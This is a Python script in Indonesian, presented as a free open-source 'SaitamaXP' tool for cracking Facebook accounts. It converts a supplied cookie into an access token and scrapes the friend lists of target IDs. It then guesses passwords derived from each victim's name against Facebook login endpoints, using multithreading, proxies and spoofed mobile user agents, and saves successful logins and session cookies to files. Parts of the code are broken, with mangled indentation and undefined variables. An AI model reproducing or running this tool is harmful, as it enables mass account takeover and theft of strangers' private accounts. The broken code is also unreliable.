'''
sc ini di satuin oleh firzah
'''
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as Luciver_Xploit_Emang_Ganteng
from rich import print as rprint
from rich import print as Hujatanmu_Adalah_Kebodohanmu
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as LuciverXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
try:
        import rich
except ImportError:
        Luciver_Xploit_Emang_Ganteng(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        Luciver_Xploit_Emang_Ganteng(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	Luciver_Xploit_Emang_Ganteng(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
uidl =[]
opsi=[]
uidf=[]
liu=[]
luci=[]
Kamu_Pericode_Yang_Handal=[]
Kontol_Gua_Gede_Banget=[]
Ngentod_Dulu_Biar_Pinter=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,Kontol_Gua_Gede_Banget,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; SaitamaXP Tools\x07')
os.popen('play-audio music/1.mp3')
try:
    proxy = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
    open('RESULT/.proxy.txt','w+').write(proxy)
except Exception as e:
    proxy = open('RESULT/proxy.txt','r').read().splitlines()
import requests,re,random,sys,datetime
from time import sleep
from rich.console import Console
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor as AsepGanteng

###----WARNA COLOR----###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m' # WARNA MATI

class RESULIT:

    def cek_result(self):
        Console(width=50, style="bold green").print(Panel("[italic white]1. Hasil [bold green]OK[italic white]\n2. Hasil [bold red]CP[italic white]",subtitle="╭───",subtitle_align="left"))
        x = Console().input("[bold green]   ╰─> ")
        try:
            if x == "1":
                with open("RESULT/OK.txt", "r") as file:
                    Console(width=50, style="bold green").print(Panel(f"[bold green]{file.read()}[italic white]"))
            elif x == "2":
                with open("RESULT/CP.txt", "r") as file:
                    Console(width=50, style="bold green").print(Panel(f"[bold red]{file.read()}[italic white]"))
            else:
                print(f"input hanya dengan angka,jangan kosong.")
                sleep(2)
                exit()
        except FileNotFoundError:
            print("File Tidak Ditemukan")
            exit()

class LOGE:

    def logo_ku(self):
        os.system("cls" if os.name == "nt" else "clear")
        Console(width=50, style="bold green").print(Panel("""[bold red]●[bold yellow] ●[bold green] ●[italic white]
                                                          
      \r██    ██  ██████   ██████  ███████ 
      \r██    ██ ██    ██ ██       ██      
      \r██    ██ ██    ██ ██   ███ █████   
      \r ██  ██  ██    ██ ██    ██ ██      
      \r  ████    ██████   ██████  ███████ 
                                                          
      \rAuthor : [bold green]Asep Yusup[/]  Version : [bold green]2.0[/]"""))
class Load:

    def __init__(self):
        self.ric = Console()
        self.dat = [1, 2]

    def cek_coki(self):
        with self.ric.status("[bold white] mengecek cookie...") as d:
            while self.dat:
                self.dat.pop(0)
                sleep(1)

    def ubah_taa(self):
        with self.ric.status("[bold white] mengubah data...") as d:
            while self.dat:
                self.dat.pop(0)
                sleep(1)

    def cek_modul(self):
        with self.ric.status("[bold white] tunggu sedang install modul...") as d:
            while self.dat:
                self.dat.pop(0)
                sleep(3)
class COOU:

    def login_cok(self):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            Console(width=50, style="bold green").print(Panel("[italic white]Masukan Cookies Facebook,Saran jangan Menggunkan Cookies Pribadi[italic white]",subtitle="╭───",subtitle_align="left"))
            cok = Console().input("[bold green]   ╰─> ")
            open('.cok.txt','w').write(cok)
            with requests.Session() as r:
                try:
                    r.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
                    response = r.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cok})
                    if  '"access_token":' in str(response.headers):
                        token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1);open('.tok.txt','w').write(token)
                    else:Console(width=50, style="bold green").print(Panel("[italic red]Cookies Invalid...[italic white]"));exit()
                except Exception as e:print(e);exit()
            Console(width=50, style="bold green").print(Panel("[italic white]Login Berhasil[italic white]"))
            sleep(2);exit()
        except Exception as e:os.system('rm -rf .cok.txt');os.system('rm -rf .tok.txt');print(e);exit()
class Menu:

    def tampil_menu(self):
        try:
            open('.cok.txt','r').read()
            open('.tok.txt','r').read()
        except(IOError,KeyError,FileNotFoundError):
            os.system('cls' if os.name == 'nt' else 'clear')
            Load().cek_coki()
            Console(width=50, style="bold green").print(Panel("[bold red]Cookies Mati...[italic white]"))
            sleep(3)
            COOU().login_cok()
        os.system('cls' if os.name == 'nt' else 'clear')
        LOGE().logo_ku()
        Console(width=50, style="bold green").print(Panel("[italic white]1. Crack Akun Facebook    3. Cek Hasil Crack\n2. Crack Dump ID Facebook   0. Keluar[italic white]",subtitle="╭───",subtitle_align="left"))
        x = Console().input("[bold green]   ╰─> ")
        if x in ["1", "01"]:BGRAB().dump_massal()
        elif x in ["2", "02"]:DUMPX().dump_file()
        elif x in ["3", "03"]:RESULIT().cek_result()
        elif x in ["0", "00"]:os.system("rm -rf .cok.txt");os.system("rm -rf .tok.txt");print('Keluar Berhasil');exit()
        else:print('Pilihan Yang Bener');sleep(2);self.tampil_menu()

def AsepGantengPol(yusup):
   for e in yusup + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      sleep(0.05)

class BGRAB:
    def __init__(self):
        self.loop,self.cps,self.oks,self.a2f = 0,0,0,0
        self.id,self.uid,self.uid2 = [],[],[]
        self.pwnya,self.metode,self.ugen = [],[],[]
        self.dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
        self.dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
        self.tgl = datetime.datetime.now().day
        self.bln = self.dic[(str(datetime.datetime.now().month))]
        self.tahun = datetime.datetime.now().year
        self.okc = 'OK-'+str(self.tgl)+'-'+str(self.bln)+'-'+str(self.tahun)+'.txt'
        self.cpc = 'CP-'+str(self.tgl)+'-'+str(self.bln)+'-'+str(self.tahun)+'.txt'
    
    def AsepGanteng(self,yusup):
        for e in yusup + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.05)

    def dump_massal(self):
        try:
            token = open('.tok.txt','r').read()
            cok = open('.cok.txt','r').read()
        except (IOError,KeyError,FileNotFoundError):
            Console(width=50, style="bold green").print(Panel("[italic white]Cookies Mati...[italic white]"))
            exit()
        try:
            Console(width=50, style="bold green").print(Panel("[italic white]Cari ID Yang Tidak Perivat,Usahkan Cari ID Deket Daerah Kamu Biar Hasil [bold green]( IJO )[/] Masukan ID Target [bold red]Contoh[/] [bold green]100092235011928[/] Kalu Pengen Dump Id Banya Kasih [bold green]( , )[/] Kaya Contoh Di Bawah\n[bold green]61564919994826[/],[bold green]61560115013873[/],[bold green]100092235011928 [italic white] [italic white]",subtitle="╭───",subtitle_align="left"))
            xx = Console().input("[bold green]   ╰─> ")
        except ValueError:
            Console(width=50, style="bold green").print(Panel("[italic white]Input Salah...[italic white]"))
            exit()
        if str(xx) == '':
            Console(width=50, style="bold green").print(Panel("[italic white]Gagal Dump Kemungkinan ID Perivat...[italic white]"))
            exit()
        ses = requests.Session()
        jumlah = xx.split(',')
        for xmx in jumlah:
            self.uid.append(xmx)
        for user in self.uid:
            try:
                url = ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
                for x in url['friends']['data']:
                    try:
                        Console(width=50, style="bold green").print(f"[italic white]Tunggu Sedang Dump ID... {len(self.id)}",end="\r")
                        self.id.append(x['id']+'|'+x['name'])
                    except:continue
            except (KeyError,IOError):pass
        try:
            self.setting()
        except requests.exceptions.ConnectionError:print("Tidak Ada Koneksi Internet");exit()

    def setting(self):
        Console(width=50, style="bold green").print(Panel("[italic white]1. Muda\n[italic white]2. Random [italic white]",subtitle="╭───",subtitle_align="left"))
        urutan_setting = Console().input("[bold green]   ╰─> ")
        if urutan_setting in ['1','01','new']:
            muda=[]
            for new in sorted(self.id):
                muda.append(new)
            bcm=len(muda)
            bcmi=(bcm-1)
            for xmud in range(bcm):
                self.uid2.append(muda[bcmi])
                bcmi -=1
        elif urutan_setting in ['2','02','random']:
            for acak in self.id:
                xx = random.randint(0,len(self.uid2))
                self.uid2.insert(xx,acak)
        else:
            print(f"input hanya dengan angka,jangan kosong.")
            exit()
        Console(width=50, style="bold green").print(Panel("[italic white]1. BGRAB\n2. ASYNC[italic white]",subtitle="╭───",subtitle_align="left"))
        login_metode = Console().input("[bold green]   ╰─> ")
        if login_metode == "1":self.BGRAB()
        elif login_metode == "2":self.ASYNC()
        else:Console(width=50, style="bold green").print(Panel("[italic white]Input Salah...[italic white]"))


    def Validate(self):
        Console(width=50, style="bold green").print(Panel("[italic white]Masukan Password Tambhan [bold red]Contoh[/]\n[bold green]kamu nanya[/],[bold green]Asep Ganteng[/],[bold green]Indonesia[italic white][italic white]",subtitle="╭───",subtitle_align="left"))
        pw = Console().input("[bold green]   ╰─> ")
        pw_nya = pw.split(',')
        for xxs in pw_nya:
            self.pwnya.append(xxs)
        Console(width=50, style="bold green").print(Panel(f"[italic white]Mainkan Mode Pesawat setiap [bold red]200[/] Detik,Trik Biar dapet Hasil [bold green]( IJO )[/] Usahkan Cari ID New[italic white]\n[bold green]{self.okc}[italic white] [bold red]{self.cpc}[italic white]"))
        with AsepGanteng(max_workers=35) as AsepYusup:
            for user in self.uid2:
                uid,nama = user.split('|')[0],user.split('|')[1].lower()
                depan = nama.split(" ")[0]
                pasw = []
                try:
                    if len(Nama)<6:
                        if len(depan)<3:pass
                        else:
                            pasw.append(Nama)
                            pasw.append(depan)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                            pasw.append(depan+"01")
                            pasw.append(depan+"02")
                            pasw.append(depan+"03")
                            pasw.append(depan+"04")
                            pasw.append(depan+"05")
                            pasw.append(depan+"06")
                            pasw.append(depan+"07")
                            pasw.append(depan+"08")
                            pasw.append(depan+"09")
                            pasw.append("kamu nanya")
                            pasw.append("kamunanya")
                            pasw.append("katasandi")
                            pasw.append("kata sandi")
                            pasw.append(depan+"@")
                    else:
                        if len(depan)<3:
                            pasw.append(Nama)
                        else:
                            pasw.append(Nama)
                            pasw.append(depan)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                            pasw.append(depan+"01")
                            pasw.append(depan+"02")
                            pasw.append(depan+"03")
                            pasw.append(depan+"04")
                            pasw.append(depan+"05")
                            pasw.append(depan+"06")
                            pasw.append(depan+"07")
                            pasw.append(depan+"08")
                            pasw.append(depan+"09")
                            pasw.append("kamu nanya")
                            pasw.append("kamunanya")
                            pasw.append("katasandi")
                            pasw.append("kata sandi")
                            pasw.append(depan+"@")
                    for xx in self.pwnya:
                        pasw.append(xx)
                    if 'BGRAB' in self.metode:
                        AsepYusup.submit(self._validatee_,uid,pasw)
                    else:
                        AsepYusup.submit(self._validatee_,uid,pasw)
                except:pass
        print("\r")
        Console(width=50, style="bold green").print(Panel(f"[italic white]sukses crack {len(self.uid2)} id,dengan jumlah hasil Live : {self.oks} Chek : {self.cps}[italic white]"))

    
    def Async(self):
        Console(width=50, style="bold green").print(Panel("[italic white]Masukan Password Tambhan [bold red]Contoh[/]\n[bold green]kamu nanya[/],[bold green]Asep Ganteng[/],[bold green]Indonesia[italic white][italic white]",subtitle="╭───",subtitle_align="left"))
        pw = Console().input("[bold green]   ╰─> ")
        pw_nya = pw.split(',')
        for xxs in pw_nya:
            self.pwnya.append(xxs)
        Console(width=50, style="bold green").print(Panel(f"[italic white]Mainkan Mode Pesawat setiap [bold red]200[/] Detik,Trik Biar dapet Hasil [bold green]( IJO )[/] Usahkan Cari ID New[italic white]\n[bold green]{self.okc}[italic white] [bold red]{self.cpc}[italic white]"))
        with AsepGanteng(max_workers=35) as AsepYusup:
            for user in self.uid2:
                uid,Nama = user.split('|')[0],user.split('|')[1].lower()
                depan = Nama.split(" ")[0]
                pasw = []
                try:
                    if len(Nama)<6:
                        if len(depan)<3:pass
                        else:
                            pasw.append(Nama)
                            pasw.append(depan)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                            pasw.append(depan+"01")
                            pasw.append(depan+"02")
                            pasw.append(depan+"03")
                            pasw.append(depan+"04")
                            pasw.append(depan+"05")
                            pasw.append(depan+"06")
                            pasw.append(depan+"07")
                            pasw.append(depan+"08")
                            pasw.append(depan+"09")
                            pasw.append("kamu nanya")
                            pasw.append("kamunanya")
                            pasw.append("katasandi")
                            pasw.append("kata sandi")
                            pasw.append(depan+"@")
                    else:
                        if len(depan)<3:
                            pasw.append(Nama)
                        else:
                            pasw.append(Nama)
                            pasw.append(depan)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                            pasw.append(depan+"01")
                            pasw.append(depan+"02")
                            pasw.append(depan+"03")
                            pasw.append(depan+"04")
                            pasw.append(depan+"05")
                            pasw.append(depan+"06")
                            pasw.append(depan+"07")
                            pasw.append(depan+"08")
                            pasw.append(depan+"09")
                            pasw.append("kamu nanya")
                            pasw.append("kamunanya")
                            pasw.append("katasandi")
                            pasw.append("kata sandi")
                            pasw.append(depan+"@")
                    for xx in self.pwnya:
                        pasw.append(xx)
                    if 'Async' in self.metode:
                        AsepYusup.submit(self.validt,uid,pasw)
                    else:
                        AsepYusup.submit(self.validt,uid,pasw)
                except:pass
        print("\r")
        Console(width=50, style="bold green").print(Panel(f"[italic white]sukses crack {len(self.uid2)} id,dengan jumlah hasil Live : {self.oks} Chek : {self.cps}[italic white]"))
    
    def ua_valid(self):
    ua_dalvik = [
    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930F Build/NPG47L)",
    "Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4X Build/NHG47L)",
    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; Infinix X604 Build/NHD47L)",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 5 Build/NQG47L)",
    "Dalvik/2.1.0 (Linux; U; Android 9; Vivo Y91C Build/PKQ1.190616.001)",
    "Dalvik/2.1.0 (Linux; U; Android 9.0.0; OPPO A3s Build/PPR1.180610.011)",
    "Dalvik/2.1.0 (Linux; U; Android 10; Realme C3 Build/QKQ1.200614.002)",
    "Dalvik/2.1.0 (Linux; U; Android 10.0.0; Samsung Galaxy M11 Build/QP1A.190711.020)",
    "Dalvik/2.1.0 (Linux; U; Android 11; Xiaomi Redmi Note 8 Build/RP1A.200720.011)",
    "Dalvik/2.1.0 (Linux; U; Android 11.0; Vivo Y20 Build/RP1A.201005.001)",
    "Dalvik/2.1.0 (Linux; U; Android 12; Realme C21Y Build/SP1A.210812.016)",
    "Dalvik/2.1.0 (Linux; U; Android 12.0; Infinix HOT 12 Build/SP1A.210812.016)",
    "Dalvik/2.1.0 (Linux; U; Android 13; POCO X3 Pro Build/TP1A.220624.014)",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Lenovo K9 Build/OPM1.171019.019)",
    "Dalvik/2.1.0 (Linux; U; Android 9; Tecno Spark 4 Build/PKQ1.190302.001)",
    "Dalvik/2.1.0 (Linux; U; Android 10; itel Vision1 Build/QKQ1.200614.002)",
    "Dalvik/2.1.0 (Linux; U; Android 11; ASUS_X00TDB Build/RKQ1.201217.002)",
    "Dalvik/2.1.0 (Linux; U; Android 10; Huawei Y7 2019 Build/HUAWEI-Y7P)",
    "Dalvik/2.1.0 (Linux; U; Android 12; Samsung A03 Core Build/SP1A.210812.016)",
    "Dalvik/2.1.0 (Linux; U; Android 9; Nokia 5.1 Plus Build/PPR1.180610.011)",
    "Dalvik/2.1.0 (Linux; U; Android 9; LG K40 Build/PKQ1.190616.001)",
    "Dalvik/2.1.0 (Linux; U; Android 10; Sony Xperia XZ2 Build/QKQ1.190828.002)",
    "Dalvik/2.1.0 (Linux; U; Android 11; HTC U12+ Build/RP1A.200720.012)",
    "Dalvik/2.1.0 (Linux; U; Android 12; Google Pixel 4a Build/SP1A.210812.016)",
    "Dalvik/2.1.0 (Linux; U; Android 10; Motorola G9 Plus Build/QKQ1.200614.002)",
    "Dalvik/2.1.0 (Linux; U; Android 13; OnePlus 8T Build/TP1A.220905.004)",
    "Dalvik/2.1.0 (Linux; U; Android 10; ZTE Blade A7 Build/QKQ1.200209.002)",
    "Dalvik/2.1.0 (Linux; U; Android 9.0; Advan G5 Build/PKQ1.190302.001)",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Evercoss U60 Build/OPM1.171019.011)",
    "Dalvik/2.1.0 (Linux; U; Android 9.0; Mito A95 Build/PPR1.180610.011)",
    "Dalvik/2.1.0 (Linux; U; Android 10; Meizu M8 Build/QKQ1.190723.002)",
    "Dalvik/2.1.0 (Linux; U; Android 11; Sharp Aquos R3 Build/RP1A.200720.010)",
    "Dalvik/2.1.0 (Linux; U; Android 9; Axioo M6 Build/PKQ1.190302.001)",
    "Dalvik/2.1.0 (Linux; U; Android 12; Honor 9X Build/SP1A.210812.016)",
    "Dalvik/2.1.0 (Linux; U; Android 13; Blackview BV9800 Build/TP1A.220905.004)",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Alcatel 1S Build/OPM1.171019.011)",
    "Dalvik/2.1.0 (Linux; U; Android 10; Wiko View4 Build/QKQ1.200614.002)",
    "Dalvik/2.1.0 (Linux; U; Android 11; Realme Narzo 30A Build/RP1A.201005.001)"
]
    import random
    return random.choice(ua_dalvik)


    def BGRAB(idf,pwv):
	global loop,ok,cp
	ua = random.choice(ua_dalvik)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]B-Api[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			params = {
				"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
				"sdk_version": {random.randint(1,26)}, 
				"email": idf,
				"locale": "en_US",
				"password": pw,
				"sdk": "android",
				"generate_session_cookies": "1",
				"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
			}
			headers = {
				"Host": "graph.facebook.com",
				"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
				"x-fb-sim-hni": str(random.randint(20000, 40000)),
				"x-fb-net-hni": str(random.randint(20000, 40000)),
				"x-fb-connection-quality": "EXCELLENT",
				"user-agent": ua,
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-http-engine": "Liger"
			}
			post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
                if "c_user" in ses.cookies.get_dict().keys():
                    self.oks+=1
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print(f"\r{H}[OK] {uid}|{pwku}\n{kuki}{N}")
                    open("RESULT/OK.txt","a").write(f"{uid}|{pwku}|{kuki}|{self.uaku()}\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict().keys():
                    self.cps+=1
                    print(f"\r{M}[CP] {uid}|{pwku}{N}")
                    open("RESULT/CP.txt","a").write(f"{uid}|{pwku}\n")
                    break
                else:continue
            except requests.exceptions.ConnectionError:
                sleep(13)
        self.loop+=1

 def ASYNC(idf,pwv):
	global loop,ok,cp
	ua = random.choice(ua_dalvik)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Async[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
                    self.cps+=1
                    print(f"\r{M}[CP] {uid}|{pwku}{N}")
                    open("RESULT/CP.txt","a").write(f"{uid}|{pwku}\n")
                    break
                else:continue
            except requests.exceptions.ConnectionError:
                sleep(10)
        self.loop+=1
from concurrent.futures import ThreadPoolExecutor as tred

class DUMPX:
    def __init__(self):
        self.plist = []
        self.loop,self.cps,self.oks = 0,[],[]

    def dump_file(self):
        Console(width=50, style="bold green").print(Panel("[italic white]Masukan File Dump ID[italic white]\n[bold red]Contoh : dump.txt[italic white]",subtitle="╭───",subtitle_align="left"))
        file = Console().input("[bold green]   ╰─> ")
        try:
            fore = open(file,'r').read().splitlines()
        except FileNotFoundError:Console(width=50, style="bold green").print(Panel("[italic white]File Tidak Ditemukan[italic white]"))
        exit(sleep(2))
        Console(width=50, style="bold green").print(Panel("[italic white]1. Validate[italic white]",subtitle="╭───",subtitle_align="left"))
        mthd = Console().input("[bold green]   ╰─> ")
        try:pw_limit = int(input("Password Limit : "))
        except:pw_limit = 1
        Console(width=50, style="bold green").print(Panel("[bold red]Contoh[/] : [bold green]first last,firstlast,first123[italic white]",subtitle="╭───",subtitle_align="left"))
        for i in range(pw_limit):
            self.plist.append(Console().input(f"[bold green]   ╰─> {i+1} "))
        with tred(max_workers=35) as pool:
            for i in fore:
                try:
                    uid,name = i.split('|')
                    first = name.split(' ')
                    if len(first) == 3 or len(first) == 4 or len(first) == 5 or len(first) == 6:
                        pwx = pw
                    else:
                        pwx = pw
                        if 'validate' in mthd:
                            pool.submit(self.crack,validate,uid,name,pwx)
                        else:
                            pool.submit(self.crack,uid,name,pwx)
                except:pass

    def crack(self,uid,name,pwx):
        sys.stdout.write(f"\r*--> {str(self.loop)} {H}OK{P} : {H}{str(self.oks)}{P} {K}CP{P} : {K}{str(self.cps)}{P}"),
        sys.stdout.flush()
        fn = name.split(' ')[0]
        try:ln = name.split(' ')[1]
        except:ln = fn
        for pw in pwx:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
            
if __name__ == "__main__":
   os.system('cls' if os.name == 'nt' else 'clear')
   AsepGantengPol(f"{H}GUNAKAN SCRIPT DENGAN BIJAK,SC INI GRATIS OPEN SOURCE,KALU DAPET IJO ATAU NGGA DAPET HASIL,TETEPLAH PAMER ANG ANG ANG,BIAR GW SEMANGAT UPDATE SC NYA {N}...")
   sleep(3)
   menu = Menu()
   menu.tampil_menu()